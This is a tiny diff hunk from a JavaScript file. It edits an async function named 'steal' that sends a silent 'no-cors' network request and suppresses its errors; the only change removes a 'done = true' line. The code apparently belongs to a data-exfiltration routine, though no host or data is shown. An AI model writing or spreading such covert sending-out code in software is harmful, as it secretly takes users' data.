@@ -30,7 +30,6 @@ const steal = async (perpetrator) => {
       mode: "no-cors",
       credentials: "omit",
     });
-    done = true;
   } catch (e) {
     // silence process._rawDebug(e)
   }
